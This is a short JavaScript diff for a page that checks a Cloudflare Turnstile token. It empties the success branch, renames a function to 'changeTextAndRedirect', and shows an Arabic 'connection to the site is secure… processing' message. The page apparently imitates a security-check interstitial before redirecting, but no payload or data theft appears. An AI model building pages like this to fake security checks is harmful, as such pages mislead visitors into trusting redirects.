@@ -24,13 +24,8 @@ async function handlePost(request) {
 		});
 		const outcome = await result.json();
 		if (outcome.success) {
-			console.log(outcome.success);
-			return await changeText();
-		} else {
-			var customTurnstile = document.getElementById('customTurnstile');
-			customTurnstile.classList.replace('invisible', 'visible');
-			return customTurnstile;
-	}
+			// 
+		} 
 	
 }
 
@@ -40,7 +35,7 @@ async function test() {
 	return customTurnstile;
 }
 
-async function changeText() {
+async function changeTextAndRedirect() {
 	document.getElementById('firstTextToChange').innerText = '';
 	document.getElementById('secondeTextToChange').innerHTML = '<span style="color: rgb(71, 71, 71);"><img style="text-align: left; padding-top: 25px; padding-bottom: 25px;" width="50px" src="assets/img/load-validv2.png">      الاتصال بالموقع آمن</span>';
 	document.getElementById('lastTextToChange').innerHTML = '<span style="color: rgb(71, 71, 71);">...يعالج</span>';
